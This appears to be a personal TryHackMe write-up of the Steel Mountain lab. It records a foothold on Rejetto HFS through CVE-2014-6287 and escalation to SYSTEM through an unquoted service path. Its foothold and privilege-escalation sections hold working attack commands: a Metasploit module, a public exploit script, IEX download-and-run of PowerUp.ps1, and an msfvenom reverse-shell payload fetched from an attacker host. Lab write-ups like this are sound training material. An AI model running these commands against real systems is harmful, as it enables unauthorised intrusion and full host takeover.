---
title: THM — Steel Mountain
type: lab-writeup
platform: THM
difficulty: foundational
os: Windows
status: Complete
date: 2026-03-28
tags:
  - foundational
  - lab
  - THM
  - windows
  - HFS
  - rejetto
  - CVE-2014-6287
  - unquoted-service-path
  - PowerUp
  - privilege-escalation
---

# THM — Steel Mountain

## Lab Info

| Field | Value |
|---|---|
| Platform | TryHackMe |
| Room | Steel Mountain |
| Difficulty | Easy-Medium |
| OS | Windows Server 2008 R2 |
| IP | Machine IP (assigned at launch) |
| Date | 2026-03-28 |

> **Summary:** Rejetto HFS 2.3 on a non-standard port gives initial foothold via CVE-2014-6287. Privilege escalation through an unquoted service path with writable directory, using PowerUp.ps1 for discovery and service restart for execution.

---

## Objectives

- [x] Recon: identify web services on multiple ports
- [x] Exploit: CVE-2014-6287 (Rejetto HFS) for initial shell
- [x] Priv esc: unquoted service path exploitation to SYSTEM

---

## Enumeration

### Port Scan

```bash
nmap -sC -sV -p- -oN nmap/steelmountain_full <MACHINE_IP>
```

**Open ports:**

| Port | Service | Notes |
|---|---|---|
| 80/tcp | http | Microsoft IIS 8.5 — Employee of the month page |
| 8080/tcp | http | HttpFileServer httpd 2.3 (Rejetto) |
| 135/tcp | msrpc | RPC |
| 139/tcp | netbios-ssn | |
| 445/tcp | microsoft-ds | SMB |
| 3389/tcp | ms-wbt-server | RDP |
| 5985/tcp | wsman | WinRM |
| 47001/tcp | http | |
| 49152-49163 | msrpc | High RPC ports |

### Web Enumeration

- Port 80: IIS default-looking page with employee photo (the employee's name is part of the THM questions)
- **Port 8080: Rejetto HFS 2.3** — this is the attack vector
- View page source on port 80 to find employee name (image filename hint)

---

## Vulnerability Background

**CVE-2014-6287 — Rejetto HFS Remote Code Execution**

Same vulnerability as [[HTB-Optimum]]. Rejetto HFS 2.3 allows RCE through null-byte injection in the search parameter, exploiting the server's macro scripting engine.

| Field | Detail |
|---|---|
| CVE | CVE-2014-6287 |
| Weakness | CWE-94: Code Injection |
| Impact | Remote code execution |
| CVSS | 9.8 (Critical) |
| Fix | Upgrade HFS to 2.3c+ |

---

## Foothold

### Metasploit Method

```bash
msfconsole
use exploit/windows/http/rejetto_hfs_exec
set RHOSTS <MACHINE_IP>
set RPORT 8080
set LHOST <YOUR_IP>
run
```

### Without Metasploit

```bash
# 1. Download exploit script
searchsploit rejetto
searchsploit -m 39161    # Python exploit

# 2. Edit exploit: set attacker IP and port
# 3. Host nc.exe via Python HTTP server
python3 -m http.server 80

# 4. Start listener
nc -lvnp 4444

# 5. Run exploit
python 39161.py <MACHINE_IP> 8080
```

Shell connects as `steelmountain\bill`.

---

## Privilege Escalation

### PowerUp Enumeration

```powershell
# Upload and run PowerUp.ps1 (PowerSploit)
# On attacker: host PowerUp.ps1
python3 -m http.server 8080

# On target (from meterpreter or PowerShell):
powershell -ep bypass
IEX(New-Object Net.WebClient).downloadString('http://<YOUR_IP>:8080/PowerUp.ps1')
Invoke-AllChecks
```

### Key Finding: Unquoted Service Path

PowerUp identifies a service with an unquoted path and a writable directory:

```
ServiceName   : AdvancedSystemCareService9
Path          : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
StartName     : LocalSystem
AbuseFunction : Write-ServiceBinary -Name 'AdvancedSystemCareService9' -Path 'C:\Program Files (x86)\IObit\Advanced.exe'
CanRestart    : True
```

The path `C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe` contains a space ("Advanced SystemCare") and is not quoted. Windows will try to execute `C:\Program Files (x86)\IObit\Advanced.exe` first. The user has write access to `C:\Program Files (x86)\IObit\`.

### Exploitation

```bash
# 1. Generate payload named Advanced.exe
msfvenom -p windows/shell_reverse_tcp LHOST=<YOUR_IP> LPORT=5555 -f exe -o Advanced.exe

# 2. Upload to target
# Via meterpreter: upload Advanced.exe "C:\\Program Files (x86)\\IObit\\Advanced.exe"
# Via PowerShell:
(New-Object Net.WebClient).downloadFile('http://<YOUR_IP>:8080/Advanced.exe','C:\Program Files (x86)\IObit\Advanced.exe')

# 3. Start listener
nc -lvnp 5555

# 4. Restart the service
Stop-Service AdvancedSystemCareService9
Start-Service AdvancedSystemCareService9

# Or from cmd:
sc stop AdvancedSystemCareService9
sc start AdvancedSystemCareService9
```

New shell connects as `NT AUTHORITY\SYSTEM`.

---

## Post-Exploitation

### Flags

| Flag | Location |
|---|---|
| User | `C:\Users\bill\Desktop\user.txt` |
| Root | `C:\Users\Administrator\Desktop\root.txt` |

---

## Key Takeaways

- **Unquoted service paths** are a real-world priv esc vector — if the path contains spaces and isn't quoted, Windows tries shorter paths first
- Three conditions must be met: unquoted path with spaces, writable directory in the path, ability to restart the service (or wait for reboot)
- **PowerUp.ps1** automates Windows privilege escalation checks — `Invoke-AllChecks` finds misconfigurations quickly
- Same Rejetto HFS vulnerability as Optimum — CVE-2014-6287 appears across multiple boxes
- Always scan all ports (`-p-`) — HFS was on 8080, not the standard port 80

---

## Tools Used

- Nmap
- Netcat
- Metasploit (optional)
- PowerUp.ps1 (PowerSploit)
- msfvenom

---

## References

- [TryHackMe — Steel Mountain](https://tryhackme.com/room/steelmountain)
- [CVE-2014-6287 — NVD](https://nvd.nist.gov/vuln/detail/CVE-2014-6287)
- [Unquoted Service Paths — MITRE ATT&CK T1574.009](https://attack.mitre.org/techniques/T1574/009/)
- [PowerSploit — GitHub](https://github.com/PowerShellMafia/PowerSploit)

---
*Write-up completed: 2026-03-28*

## See Also

- Penetration-Testing-Methodology
- Windows-Privilege-Escalation
- HTB-Optimum — Same initial exploit (CVE-2014-6287)
- Nmap
- Reverse-Shell-Cheatsheet
---
<- [[Labs-MOC]]